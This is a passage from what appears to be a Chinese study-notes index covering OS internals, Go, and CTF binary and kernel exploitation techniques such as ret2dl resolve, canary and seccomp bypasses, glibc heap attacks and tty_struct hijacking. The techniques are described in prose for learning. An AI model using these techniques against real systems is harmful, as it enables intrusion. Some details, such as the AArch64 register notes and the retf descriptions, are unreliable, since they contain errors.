的一切 - 知乎 (zhihu.com)\",\"操作系统需要将父进程虚拟内存空间中的大部分内容全部复制到子进程中（主要是数据段、堆、栈；代码段共享）\",\"fork还是接触比较多 在程序中或者ctf题中 有时候fork可以带来一些新的思路\",\"fork函数是创建一个新的进程 并且copy 父进程的栈堆代码等段信息\",\"子进程会获取父进程的所有文件副本 所以文件描述符也是操作的对应一样的文件\",\"当fork函数调用用了新的进程后 如果马上调用exec加载新的程序 那么fork之前执行的栈堆代码段等的拷贝就是白用工 胡总和说性能损失巨大 所以fork函数采用了cow技术 只有当进程尝试写入共享区域的某个页面的时候 才会为这个页面创建一个新的副本\",\"exec并不会导致pid的改变 直接将新的程序的用户空间代码和数据完全替换当前进程\",\"虚拟内存管理技术\",\"img\",\"只有当进程实际访问内存资源的时候才会建立虚拟地址和物理地址的映射 调入物理内存页\",\"直接映射区\",\"前（最小）896mb的内核空间是与物理地址前896mb 直接进行的映射\",\"动态内存映射区\",\"该区域由vmalloc进行分配 线性空间连续 对应的物理空间不一定连续 可能是处于低端或者高端的内存中\",\"永久内存映射区\",\"这个区域可以访问高端内存 alloc_page分配高端内存页 kmap函数可以通过将高端的内存映射到该区域去\",\"固定内存映射区\",\"这里的地址有特殊用途\"]},\"17\":{\"h\":\"fork的cow技术\",\"t\":[\"当创建子进程的时候父进程直接将虚拟内存到物理内存的映射关系复制到子进程中 并且将内存设置为只读这样写入的时候就会触发缺页保护\",\"当不同进程要对内存数据进行修改的时候就会触发写时复制(cow)机制 才会进行拷贝\",\"image-20240511234355582\",\"触发缺页异常后 内核在缺页异常的回调处理函数中进行物理内存页的复制 并且把内存页设置为可读可写状态\"]},\"18\":{\"h\":\"重定向\",\"t\":[\"1>也就是标准输出流定向到某个文件种\",\"2>也就是错误输出流定向到某个文件种\",\"所以在禁用了1情况下可以通过重定向到0\",\"以及其实直接向0输出也是可以的 但是pwntools在本地是无法接受到这个的\"]},\"19\":{\"h\":\"信号中断\",\"t\":[\"操作系统中的中断（详细介绍+图片理解）_系统运行中断情况监控图-CSDN博客\"]},\"20\":{\"h\":\"类型\",\"t\":[\"我们可以大致把中断分为中断和异常 异常还分为故障 陷阱 中止 中断还有:硬中断 软中断之分 硬中断也就是中断异常这类 而软中断比如:int 0x80之类的\",\"中断是异步的 \",\"比如鼠标点击之类的\",\"异常是同步的 \",\"比如cpu的异常事件 缺页异常 错误指令异常等\",\"软件中断 \",\"与硬中断不同 硬中断是每完成一个生命周期后都会去检测一下有没有中断信号 然后去完成中断处理操作 而软中断是单独有个守护进程不断轮询标志位 软中断更类似于注册了一个对象列表 然后不断轮询这个列表查看标志位 如果标志位发生了改变 就去调用对应的处理函数 这是一种比较先进的思想\",\"硬中断更像是响应 因为cpu的时间是宝贵的 所以会在响应后 交给软中断来处理 这样才能实现较高的利用效率\"]},\"21\":{\"h\":\"处理\",\"t\":[\"当接收到中断信号后 就会根据中断信号 去找中断描述符表(IDT 通过idtr寄存器找到IDT地址)中寻找段选择子和段内偏移 通过段选择子去全局描述符(GDT)中寻找基地址 然后加上偏移地址获取真正的地址 如果开了分页机制 那么再根据这个地址进行分页转化 也就是线性地址转向真实的物理地址（比如二级分页机制的话 前10位获取页目录项从而定位到页目录再通过中12位获取页目录中第几项获取其基础地址然后加上最后10位偏移地址获取真实的地址）\"]},\"22\":{\"h\":\"GO底层\",\"t\":[\"网站是看的这个:Introduction · 深入解析Go (gitbooks.io)\",\"书籍是Go语言设计与实现\"]},\"23\":{\"h\":\"面试技巧\",\"t\":[\"协程，是一种比线程更加轻量级的存在。正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。\",\"最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态中执行）。\",\"切片是引用类型 而数组是值类型 []int这样定义是切片 [4]int这样定义是数组 然后数组传递过去不会导致原本的值改变 切片会导致\"]},\"24\":{\"h\":\"结构体中指针函数和普通函数\",\"t\":[\"比如我定义一个结构体\",\"type A struct { } func (a *A)Func1(){} func (a A)Func2(){} \",\"这里的a 其实由于golang都是值传递 所以在 func1 中a *则是a的指针被传递过去 然后对a进行操作的话 会修改变量的值 但是如果func2中对a进行操作就是对a的备份进行操作无法修改原本的值\"]},\"25\":{\"h\":\"字典实现\",\"t\":[\"是通过hash链表 大概就是首先通过链表把各个桶链接起来 然后对key进行取hash然后取余 得到下标如果下标一致 则直接在桶后面添加这个value\"]},\"26\":{\"h\":\"接口实现\",\"t\":[\"结构体中存储类型的hash值 并且存储一个unsafe指针 这样就可以实现各个类型的断言转化了\"]},\"27\":{\"h\":\"数组实现\",\"t\":[\"数组主要是结构体中存储了长度 然后存储数组指针\"]},\"28\":{\"h\":\"切片实现\",\"t\":[\"结构体中存储了长度和容量以及指针这样就可以实现动态扩容了\"]},\"29\":{\"h\":\"函数调用规范\",\"t\":[\"先压入返回地址 然后压入参数最后压入返回参数 所以go的函数调用参数和返回值都是依赖于栈进行传递的\",\"并且golang中的参数传递都是值传递 也就是拷贝一份\"]},\"30\":{\"h\":\"深/浅copy\",\"t\":[\"Go语言讲解深拷贝与浅拷贝 - 简书 (jianshu.com)\",\"深copy是复制对象的值 创建一个新的对象进行存储 所以修改新对象 不会影响原对象的值 内存地址不同\",\"浅copy是复制对象的指针 这样新对象修改的时候老对象也会发生变化 比如Slice Map\",\"package main import \\\"fmt\\\" func main() { slices1 := []int{ 1, 2, 3, 4, } slices3 := []int{ 1, 2, 3, 4, } slices4 := slices3[1:] slices4[1] = 6 slice2 := slices1 slice2[1] = 6 fmt.Println(slices1) fmt.Println(slices1) // [1 6 3 4] //[1 6 3 4] } \"]},\"31\":{\"h\":\"闭包\",\"t\":[\"在go语言中闭包函数 所引用的父类变量都不能在栈上分配 因为这样父函数执行完毕后栈上变量就失效了 所以这些变量都是在堆上分配的 会专门产生一个闭包结构体来存储这些外部引用变量\"]},\"32\":{\"h\":\"一等公民\",\"t\":[\"高阶函数编程：探索Go语言中的函数一等公民-腾讯云开发者社区-腾讯云 (tencent.com)\",\"在给定的编程语言设计中，一等公民是指支持所有通常可用于其他实体的操作的实体。这些操作通常包括作为参数传递、从函数返回和赋值给变量。\",\"参数传递\",\"函数返回值\",\"赋值给变量\"]},\"33\":{\"h\":\"Python\"},\"34\":{\"h\":\"asyncio(TODO)\",\"t\":[\"await的for循环可能导致的runtimeError问题\"]},\"35\":{\"h\":\"Pwn\"},\"36\":{\"h\":\"ret2dl\",\"t\":[\"流程是 先执行跳转到GOT[3] 然后GOT[3]存储的是plt[1] 也就是先压reloc_arg参数 然后jmp到plt[0] plt[0]存储的是push link_map(GOT[1]) 然后跳转到_dl_runtime_resolve函数也就是GOT[2]\",\"然后分析一下两个参数 一个是reloc_arg 我们可以通过这个知道我们要绑定的函数名字 也就是从reloc_arg为下标 然后rel_plt[reloc_arg]获取elf_rel信息 提取elf_rel.r_info信息 这个是个指针 然后解引 就获取了名字的下标 然后通过dynstr[st_nameh]获取函数的名字\",\"那么我们如果可以伪造reloc_arg 然后让rel_plt表索引到bss段 我们可控区域 这样就可以伪造elf_rel的信息 从而伪造r_info的信息 让这个指针指向我们想要调用的函数 然后dynstr就可以直接调用我们的函数了\"]},\"37\":{\"h\":\"c - main函数参数含义\",\"t\":[\"第一个参数argc 也就是传给程序的参数个数 包含了程序文件自己本身的名字 比如./new.exe a b 那么参数就是三个\",\"argv 字符串数组指针 包含程序名称\",\"envp 环境变量字符串数组的指针\"]},\"38\":{\"h\":\"canary 多线程绕过\",\"t\":[\"参考文章:(´∇｀) 欢迎回来！ (cnblogs.com)\",\"在创建新线程的时候 在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。 从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。从TLS到pthread_create的函数参数传递栈帧的距离小于一页。 现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。简单来说就是因此会顺便创建一个TLS，而且这个TLS会存储Canary的值，而TLS会保存在stack高地址的地方\"]},\"39\":{\"h\":\"格式化字符串\",\"t\":[\"%*25$d从栈中取变量作为N，比如：栈25$处的值是0x100，那么这个格式化字符串就相当于%256d。（sample：pwn4-MidnightsunCTF-2020）\"]},\"40\":{\"h\":\"ORW沙箱绕过总结\",\"t\":[\"[Pwn - Shellcode Summary | HeyGap's_Blog](https://heygap.github.io/2024/02/08/Pwn - Shellcode Summary/#1-1-shellcode-板子)\",\"[沙箱绕过 | Brvc3's Base](https://brvc3.github.io/2021/05/03/沙箱绕过/#:~:text=绕过方式 禁用了execve或者system 通过 open read write 来读取flag example：,lgd 禁用了 open，write，read openat，所以直接 调用openat，然后除了 read，write，其实还有两个readv，和writev，这些就能绕过限制读取flag%2C有些连openat都禁用的可以 ptrace 修改syscall)\"]},\"41\":{\"h\":\"Seccomp BPF\",\"t\":[\"linux2.6.23内核用ptctl来代替/proc/PID/seccomp进行添加禁用 2012后linux 3.5 增加了新的模式 过滤模式 我们可以允许系统调用\",\"2014年，Linux 3.17 引入了seccomp()系统调用，seccomp()在prctl()的基础上提供了现有功能的超集\",\"BPF就是在内核层起了一层虚拟机 这个虚拟机 起到了过滤作用 这样每次系统调用就会经过该过滤器 此过程不可逆\",\"然后prctl中第二个参数代表操作的对象 如果这个参数为1 则对所有的用户都起作用 会让子进程都受到这个过滤器的限制\",\"ptctl还可以让内核进入严格模式 进程可用的系统调用就只有4个 read(), write(), _exit(), 和 sigreturn()\",\"docker也运用了这项技术 实现了沙盒禁止\"]},\"42\":{\"h\":\"常规绕过\",\"t\":[\"在禁用了大量函数的情况下 我们可以选择一些思路来进行绕过\",\"切换为32位 错开禁用号 进行调用 修改cs寄存器的值 我们一般采用refq 0x23就是32位运行模式 0x33就是64位运行模式\",\"fork一个新的线程 pipe + fork + exec: 创建一个管道\",\"侧信道攻击（无write）\",\"socket通讯 套接字函数来实现 当然前提是别是禁用所有用户\",\"字节不够情况下\",\"观察堆栈 用pop push等栈传递 因为字节很小 一些长的寄存器可以改为短的寄存器\"]},\"43\":{\"h\":\"io_uring利用\",\"t\":[\"io_uring - guanyubo - 博客园 (cnblogs.com)\",\"io_uring主要是两个环形缓冲区构成 sq 和cq 也就是submit queue 和completion queue 都是处于内核空间的 但是用户可以直接访问内核\",\"sq也就是存放用户提交的io请求\",\"cq也就是处理完的sq中的io请求就会填充到cq中 并且通知用户空间i请求完成\",\"流程\",\"io_uring_setup() 系统调用创建 io_uring 实例\",\"提交请求:也就是将io写入sq \",\"io_uring_enter() 提交io事件并且等待其完成 int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete, unsigned flags, sigset_t *sig); fd也就是io_uring_setup的返回值 to_submit也就是要提交的事件数量 min_complete也就是函数返回之前要完成的事件最小数量 sig也就是信号集的指针 用于io完成的时候接受信号 返回值是完成的事件数量\",\"**io_uring_register()**用于注册内核用户共享缓冲区，如文件描述符、缓冲区等。 成功返回0\",\"**io_uring_unregister()**用于取消之前通过 io_uring_register() 注册的资源。\",\"首先使用 io_uring_prep_*() 函数准备 I/O 操作，然后使用 io_uring_submit() 提交这些操作到 io_uring 中进行处理。 \",\"io_uring_prep_readv()：准备读取操作。\",\"io_uring_prep_writev()：准备写入操作。\",\"io_uring_prep_poll_add()：注册一个轮询事件。\",\"内核处理 内核会定期检查sq如果有新的请求就并行处理 也就是同时干\",\"完成通知 当将内容填充进入cq 然后通知用户\",\"用户顶级检查cq发现请求完成后 从cq中取出结果进行后续处理\",\"优点\",\"异步性\",\"非堵塞性\",\"批量处理\",\"灵活性\"]},\"44\":{\"h\":\"refq和retf详解\",\"t\":[\"参考文章:汇编语言 Ret和retf指令_汇编ret和retf-CSDN博客\",\"从汇编角度看retn和retf-百度开发者中心 (baidu.com)\",\"retn (return near) 用栈中数据修改ip寄存器\",\"retf (return far)用栈中数据修改cs:ip寄存器\",\"retfq 和retf一样但是retfq是从64位转化到32位 retf是从32位转到64位\",\"先弹出栈顶给ip然后弹出给cs寄存器 0x33(64位) 0x22(32位)\"]},\"45\":{\"h\":\"为什么用rax间接传参\",\"t\":[\"比如我们没办法直接将一个较大的立即数通过push等直接推入栈 我们需要先赋值给rax 然后推入rax\"]},\"46\":{\"h\":\"arm架构函数调用规范 armv7和armv8的区别\",\"t\":[\"ARMv7和ARMv8架构比较-CSDN博客\",\"[原创] CTF 中 ARM & AArch64 架构下的 Pwn-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"[ARM pwn 环境搭建+基础入门 | Pwn进你的心 (ywhkkx.github.io)](https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/)\",\"armv7主要是32位指令集 armv8是64位指令集合\"]},\"47\":{\"h\":\"armv7\",\"t\":[\"32位 是利用的r寄存器 一共16个 然后R0-3一啊不能用作函数的参数传递和返回值使用 也可以在程序中保存立即数\",\"r7存储系统调用号\",\"r12 也就是ip r11作为栈指针用作栈底可用于栈回溯 r13sp栈指针 r14 lr链接寄存器 r15 pc 程序计数器\",\"r0存储float返回值 r0-r1存储double\",\"前四个参数都是r0-r3寄存器传递 然后后面通过栈传递\",\"在进行bl等指令的时候 pc存入lr 然后更新pc 就可以通过lr寄存器进行恢复\",\"返回值会被优化 也就是当返回值是一个结构体的时候那么r0就不是第一个参数而是返回值的指针\",\"返回是通过pop {pc}进行的返回\",\"函数调用规范\",\"也就是先保存栈底和下一个指令地址\",\"然后r11设置为栈顶 然后sp展开 这里和x86不同的是arm架构是先进行栈帧展开 再进行的函数跳转\",\"push {r11, lr} /* 序幕的开始,将帧指针和LR保存到堆栈 */ add r11, sp, #0 /* 设置栈底帧 */ sub sp, sp, #16 /* 序幕结束,在堆栈上分配一些缓冲区(这也为堆栈帧分配空间) */ \",\"然后就是寄存器赋值\",\"mov r0, #1 /* 设置局部变量 (a=1)。 这也用作设置函数 max */ 的第一个参数 mov r1, #2 /* 设置局部变量 (b=2)。 这也用作设置函数 max */ 的第二个参数 bl max /* 调用/分支到函数 max */ \",\"返回的时候 也就是将sp变回栈底 然后将栈底和pc返回原本的值\",\"sub sp, r11, #0 /* 结尾的开始,重新调整堆栈指针 */ pop {r11, pc} \",\"arm中ldr是load register str也就是store register\",\"load register 也就是将指针的值存入寄存器中\",\"store register 也就是将寄存器的值存入指针中\",\"arm中str r2 ,[r1 ,#2]也就是存入r+2的位置 但是r1的值不改变\",\"str r2,[r1,#2]!也就是r1的值会发生改变 也就是将最后的地址写入原寄存器中 所以就是+4 !的意思是请求回写\",\"ldr r2,[r1],#-2 也就是r1直接赋值给r2 然后r1减去2\"]},\"48\":{\"h\":\"armv8\",\"t\":[\"arm64架构大差不差 也就是把lr和栈底压入栈 然后栈减去\",\"寄存器名字叫做X了 X0-x7用作参数传递 X0用作函数返回值 x8用作调用号 x32是pc寄存器 x30也就是函数返回值 然后函数调用的时候直接将原本的sp压栈 然后sp减去一定值 最后再回来\",\"BR指令 BLR指令\"]},\"49\":{\"h\":\"mips架构的函数调用规范\",\"t\":[\"mips是存在叶子函数的 叶子函数也就是函数中不会去调用其他任何函数 非叶子函数就是还会调用其他的函数\",\"a调用b的情况 非叶子函数 会将返回地址存入栈中 \",\"叶子函数的话 则返回a的i地址存储再ra寄存器中\",\"当函数返回的时候 如果是非叶子函数 则从堆栈中取出返回地址 然后存入ra寄存器 然后再跳转返回 \",\"叶子函数则直接ra进行跳转\",\"返回值存储再v0-v1中\",\"[mips pwn | p1Kk's World!](https://p1kk.github.io/2020/01/01/异构pwn/mips pwn/#缓冲区溢出分析示例)\",\"调用者把参数都保存在a0-a3寄存器 也就是前4个用寄存器保存后面用栈保存\",\"返回地址存储再ra寄存器上\"]},\"50\":{\"h\":\"phpPwn堆管理机制\",\"t\":[\"[第5章 内存管理 - 5.1 Zend内存池 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\",\"php中针对内存的操作进行了一层封装 用于替换内存操作 实现malloc free等操作 也就是参考了tcmalloc函数\",\"php内存管理中有三种颗粒度的内存块 也就是chunk page slot 每个chunk占2m 然后page占比4kb 一个chunk会被分配为page 然后page再分配为slot\",\"也就是申请大于2m则申请chunk 大于3/4page就申请page 然后小于3/4page 就申请slot\",\"Huge(chunk): 申请内存大于2M，直接调用系统分配，分配若干个chunk\",\"Large(page): 申请内存大于3092B(3/4 page_size)，小于2044KB(511 page_size)，分配若干个page\",\"Small(slot): 申请内存小于等于3092B(3/4 page_size)，内存池提前定义好了30种同等大小的内存(8,16,24,32，…3072)，他们分配在不同的page上(不同大小的内存可能会分配在多个连续的page)，申请内存时直接在对应page上查找可用位置\",\"都是受到heap结构体管理 用于管理上面三种内存的分配 main_chunk属性是chunk链表 free_slot就是一些固定大小的slot链表 类似于lagrebin的管理模式 2024d3中phppwn那题就是通过劫持slot链表来进行任意写\",\"这里利用的是mmap函数进行的申请内存 而非malloc函数的brk等\"]},\"51\":{\"h\":\"cpp堆管理机制（todo）\"},\"52\":{\"h\":\"musl堆管理器\",\"t\":[\"参考文章:musl 知：内存管理_musl-1.1.20-r5-CSDN博客\",\"轻量级的嵌入式开发glibc库\"]},\"53\":{\"h\":\"堆利用\",\"t\":[\"因为太过重要 以及知识点体系过于庞大 所以单独拿出来 house系列主要是这个Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)文章进行总结得很好 这里大量直接进行copy\",\"然后总结文章:一篇文章彻底讲懂malloc的实现（ptmalloc）_malloc过程-CSDN博客\",\"有一些很容易想要的一些利用方式这里就不单独列出来了 比如修改fd 控制malloc到的数据 主要是总结一些利用难度较高 比较成体系的利用方式\"]},\"54\":{\"h\":\"malloc函数中的一些检查机制\",\"t\":[\"这个主要是写在源码注释中了 翻阅源码即可然后找到一个很好用的网站写了源码中的宏定义heap - 5 - malloc、free函数相关的宏定义 | Kiprey's Blog\"]},\"55\":{\"h\":\"常见利用技巧\",\"t\":[\"overlapping: 这个技巧主要是通过off_by_null漏洞进行控制size位的prev_inused这个位 这个操作十分方便 我可以间接利用然后实现劫持正在使用的合法chunk 然后我们就可以绕过一些题目中的free检查 比如有一些题必须free 表中记录正在使用的chunk才是合法的 无法直接double free 我们可以通过劫持合法chunk轻松实现double free 具体就是让我们要劫持的chunk刚好处于合并区间之间比如:malloc 五个chunkchunk1,chunk2,chunk3,chunk4,chunk5然后chunk1的内容部分构造好fakechunk根据版本的安全检查进行构造 如果版本较高我们需要计算并且构造好size区域 fd 以及bk然后chunk2就为我们要劫持的chunk 我们通过chunk3写入内容覆盖chunk4完成覆写p位并且构造好prev_size让它刚好指向我们的fakechunk然后最后我们free chunk4触发合并机制 让chunk4到fake chunk之间的内容全部进入unsortedbin中 这样我们malloc下来就可以进行劫持了 这个方法较为好用\"]},\"56\":{\"h\":\"House of force(top chunk 利用)\",\"t\":[\"主要是我们能溢出数据到topchunk的size区域 然后malloc的时候malloc一个超大值让它刚好到我们想要控制的地址附近去\",\"范围:2.23——2.29\",\"因为2.29后加入了对size区域的检查 导致我们没办法再通过直接获取任意地址\"]},\"57\":{\"h\":\"largebin attack\",\"t\":[\"主要是利用了unsoretdbin 的入链机制 也就是当我们所需要的chunk不属于fastbin tcachebin 已有chunk大小 需要从unsrotedbin中取chunk的时候 触发unsortedbin分类合并机制 如果unsortedbin中chunk有一个chunk属于largebin的范围 并且比largebin chunk的最小的chunk还小 我们如果可以劫持largebin 最小的那个chunk 就可以触发一个任意写已知地址 并且还可以实现堆地址的泄露 十分好用的技巧\"]},\"58\":{\"h\":\"smallbin attack(todo)\"},\"59\":{\"h\":\"House of kiwi\",\"t\":[\"利用malloc_assert的fflush(stderr);来触发调用链\",\"通过触发assert函数中的fflush 然后调用_io_file_jumps的_io_FILE_SYNC指针 并且rdx恒为_IO_helper_jumps指针\",\"我们可以将_io_file_sync指针调整为setcontext+61触发rdx到寄存器的赋值 然后我们劫持_IO_helper_jumps(0xa0 0xa8)实现 \",\"修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移\"]},\"60\":{\"h\":\"house of cat\",\"t\":[\"可以打fsop 也就是打main函数返回 程序执行exit libc执行abort(高版本已经删除) __malloc_assert则是在malloc中触发，通常是修改top chunk的大小。\",\"触发__malloc_assert调用__fxprintf\",\"主要是想办法调用_IO_xxx_jumps\",\"__malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function) { (void) __fxprintf (NULL, \\\"%s%s%s:%u: %s%sAssertion `%s' failed.\\\\n\\\", __progname, __progname[0] ? \\\": \\\" : \\\"\\\", file, line, function ? function : \\\"\\\", function ? \\\": \\\" : \\\"\\\", assertion); fflush (stderr); abort (); } \",\"然后__fxprintf又调用__vfxprintf函数 然后调用locked_vfxprintf 然后调用__vfwprintf_internal然后调用对应的vtable函数\",\"image-20240602023528121\"]},\"61\":{\"h\":\"printf/puts io调用链(TODO)\"},\"62\":{\"h\":\"linux Kernel\",\"t\":[\"kernel部分比较重要需要重新梳理一下 以及理顺一些脉络\"]},\"63\":{\"h\":\"段保护模式/页保护模式\",\"t\":[\"一般来说我们的逻辑地址会经历转化才回到真正的物理地址去\",\"4.1 为什么要有虚拟内存？ | 小林coding (xiaolincoding.com)\",\"虚拟地址->线性地址->物理地址\",\"32位我们比较熟悉 在复习中断的时候 我们已经大概的复习了一下两级分页机制 然后下面图是大佬博客里面的四级分页机制的图 讲解得很仔细\"]},\"64\":{\"h\":\"虚拟地址转化为线性地址\",\"t\":[\"依赖于段选择子也就是段寄存器 段选择子再去\"]},\"65\":{\"h\":\"实/保护模式\",\"t\":[\"实模式就是简单通过cs:ip这样的方式直接访问内存\",\"保护模式就是通过段机制 来间接访问内存\"]},\"66\":{\"h\":\"进程\",\"t\":[\"5.1 进程、线程基础知识 | 小林coding (xiaolincoding.com)\",\"一般多线程 如果一个线程挂了就会导致全部线程崩溃 因为线程是共享内存的 如果一个线程崩溃了就会导致内存有错误 不确定会带来一些难以想象的后果 所以其他线程也会更随着崩溃\",\"操作系统通过pcb进程控制块来描述进程 pcb通常是相同状态的链表链接在一起的\",\"进程是资源（包括内存、打开的文件等）分配的单位，线程是 CPU 调度的单位；\"]},\"67\":{\"h\":\"execve\",\"t\":[\"是先将程序头写入进入新的内存 然后通过cow进行copy其他代码部分\",\"覆盖原有的进程 会改变代码段\"]},\"68\":{\"h\":\"oom机制\",\"t\":[\"4.3 内存满了，会发生什么？ | 小林coding (xiaolincoding.com)\",\"当进行申请内存 内存不够 并且回收一些内存（kswapd）后依旧不够就会杀死一个物理内存占用较高的进程 直到释放足够的内存位置\",\"回收内存(lru算法): \",\"内存页(大多数内存页都是可以直接释放的 以后有需要了 在进行重新读取即可 如果已经被程序修改过了 并且暂时没有写入磁盘的数据(脏页) 会先写入磁盘 然后再进行内存的释放)\",\"匿名页:比如栈堆等 这些内存随时有可能再次被访问所以不能直接回收所以会利用swap机制先写入磁盘中 然后再释放内存\"]},\"69\":{\"h\":\"如何保护一个进程不被 OOM 杀掉呢？\",\"t\":[\"oom主要是根据进程的得分来进行评估是否要杀掉 \",\"第一，进程已经使用的物理内存页面数。\",\"第二，每个进程的 OOM 校准值 oom_score_adj。它是可以通过 /proc/[pid]/oom_score_adj 来配置的。我们可以在设置 -1000 到 1000 之间的任意一个数值，调整进程被 OOM Kill 的几率。\",\"所以我们可以通过 oom_score_adj来避免被杀 比如把这个值设置位-1000\"]},\"70\":{\"h\":\"linux的内存管理\",\"t\":[\"32位操作系统和64位操作系统在内核内存的分布是不一样的\",\"首先在32位操作系统中内核虚拟内存和进程虚拟内存是无缝衔接的 而64位操作系统内核和用户空间是存在一大块空洞空间的\",\"存在原因是因为64位用高16位作为标记 也就是0x0000 7fff ffff f000以下为用户 0xffff 8000 0000 0000以上是内核\",\"32位是4g 64位是16 EB\",\"32位内核内存分布\",\"最先是896mb（直接映射区域）是和物理内存一一对应的 但是其还是使用的虚拟地址并且也要通过映射转化为物理地址 \",\"其中前16mb是DMA区域 用于存放\",\"剩下就是NORMAL区域\",\"高端内存也就是896mb之上的区域（128mb）采用的是动态映射技术 \",\"vmalloc 区域 也就是使用vmalloc进行申请的区域\",\"永久映射区 也就是允许建立与物理高端内存的长期映射关系 比如内核通过alloc_pages函数申请物理内存页 这些物理内存页通过kmap映射到永久映射区\",\"固定映射区\",\"临时映射区 也就是缓冲区的作用比如做一些copy操作的时候\",\"图片\",\"64位内核内存分布\",\"64位的由于空间巨大 不需要和32位一样精细规划 所以相对而言简单一些\",\"64t的直接映射区\",\"32t的vmalloc区域\",\"1t虚拟内存映射区\",\"512mb代码段\",\"伙伴算法\",\"分配内存页使用alloc_pages来完成 而alloc_pages是通过rmqueue()来分配内存页\"]},\"71\":{\"h\":\"如果4g物理内存的机子上面申请8g内存会怎样\",\"t\":[\"4.4 在 4GB 物理内存的机器上，申请 8G 内存会怎么样？ | 小林coding (xiaolincoding.com)\",\"如果32位操作系统的情况下 我们申请就会失败 因为32位操作系统虚拟内存也就4g\",\"64位操作系统是成功的 因为cow的关系 我们只有真的写的时候才会影响实际的物理内存\"]},\"72\":{\"h\":\"Pwn linux kernel\"},\"73\":{\"h\":\"调试\",\"t\":[\"环境拿下来后可以通过指令直接运行起内核 然后通过调试\",\"qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -s \",\"当题目中不存在vmlinux文件的时候 我们要调试内核或者查看rop链的时候 可以用 extract-vmlinux 命令可以从 bzImage种提取vmlinux\",\"一般情况下我们需要提取出来ko文件 目前linux kernel文件系统 主要分为两种:ext4和cpio 两种我们的提取方式不同\",\"Linux Kernel Pwn 初探 - 先知社区 (aliyun.com)\",\"ext4 直接将文件系统挂载在已有的目录中 \",\"mkdir ./rootfs\",\"sudo mount rootfs.img ./rootfs\",\"此时这个时候这个目录下就已经有了我们的文件目录\",\"cpio 这个稍微多一步也就是 解压文件系统 重打包 \",\"mkdir extracted; cd extracted\",\"cpio -i --no-absolute-filenames -F ../rootfs.cpio\",\"此时与其它文件系统相同，找到rcS文件，查看加载的驱动，拿出来\",\"find . | cpio -o --format=newc > ../rootfs.cpio\"]},\"74\":{\"h\":\"常规保护机制\",\"t\":[\"Linux Kernel Pwn 初探 - 先知社区 (aliyun.com)\",\"KPTI：Kernel PageTable Isolation，内核页表隔离\",\"KASLR：Kernel Address space layout randomization，内核地址空间布局随机化 \",\"也就是kernel的ASLR\",\"SMEP：Supervisor Mode Execution Prevention，管理模式执行保护 \",\"也就是内核状态下不允许执行用户态的代码\",\"SMAP：Supervisor Mode Access Prevention，管理模式访问保护 \",\"也就是内核状态下不允许访问用户态的数据\",\"SMEP与SMAP这两个都是通过cr4寄存器来进行判断开启关闭的 所以我们如果可以修改cr4的值 我们就可以实现绕过这两个保护\",\"Stack Protector：Stack Protector又名canary，stack cookie\",\"kptr_restrict：允许查看内核函数地址\",\"dmesg_restrict：允许查看printk函数输出，用dmesg命令来查看\",\"MMAP_MIN_ADDR：不允许申请NULL地址 mmap(0,....)\"]},\"75\":{\"h\":\"常用利用结构体\",\"t\":[\"tss_struct 中cr3主要是存储页目录的物理地址 cs寄存器末尾存储当前的权限等级\"]},\"76\":{\"h\":\"mm_struct\",\"t\":[\"主要负责对内存区域的大致划分结构体属性存储的就是各个内存区域的边界\",\"图片\"]},\"77\":{\"h\":\"vm_arena_struct结构体(双向链表)\",\"t\":[\"描述一个内存区域的开始结束 权限 是否能共享(mmap)等信息 以及存储了虚表指针(open close 等)\",\"图片\"]},\"78\":{\"h\":\"cred结构体\",\"t\":[\"创建一个新进程的时候 内核会申请一个cred结构体 存放进程信息 主要是一些权限信息之类的\"]},\"79\":{\"h\":\"tty_struct\",\"t\":[\"学习文章:tty_struct数据结构_ttystruct-CSDN博客\",\"linux kernel pwn学习之伪造tty_struct执行任意函数_tty struct-CSDN博客\",\"tty_driver 是驱动通过alloc_tty_driver函数分配的 也就是调用kzalloc tty0也就是控制台的文件体现\",\"tty_driver的flags等在未被赋值的时候所有值都是0\",\"当open(ptmx)的时候会初始化tty_struct\",\"攻击手段就是利用在调用对ptmx驱动进行write操作的时候我们是利用的tty_struct结构体中虚表进行的操作 所以我们如果可以伪造这个vtable然后指向我们的可控区域 来实现函数的调用\"]},\"80\":{\"h\":\"堆喷/脏管道学习(TODO)\"},\"81\":{\"h\":\"V8/jsc(TODO)\"},\"82\":{\"h\":\"标记指针\",\"t\":[\"v8中利用指针标记技术在v8的堆指针中存储额外的数据 比如32位操作系统下最低有效位用来区分smis/堆指针 第二个最低有效位来区分强引用和弱引用 64位操作系统用前32位进行当作负载 \",\"强引用也即是垃圾回收器不会去回收这个对象 内存不足也不会去回收 必须是显式释放\",\"软引用用于描述一些有用但不是必须的对象 内存不足有可能被回收比如java中用new SoftReference来进行引用\",\"弱引用 下次垃圾回收就有可能被回收\"]},\"83\":{\"h\":\"压缩指针\",\"t\":[\"v8 将高32位存储在r13寄存器中\"]},\"84\":{\"h\":\"js对象基础属性\",\"t\":[\"prototype 也就是js对象都是继承自另外个对象 也就是父对象 父对象被称之为原型对象(null除外 它没有自己的原型对象)\",\"所以当调用对象的函数或者属性的时候 如果没有该属性或者方法就会去原型对象上面查找 如果找到不到就一直向上寻找直到最顶层的Object.prototype 如果最自己本身具备就不会去找原型\"]},\"85\":{\"h\":\"编译整体流程(TODO)\"},\"86\":{\"h\":\"如何调试(TODO)\"},\"87\":{\"h\":\"编译原理\",\"t\":[\"编译器主要是四个阶段 \",\"预处理 \",\"比如对宏进行展开\",\"编译 \",\"生成汇编语言 \",\"语法分析(syntax 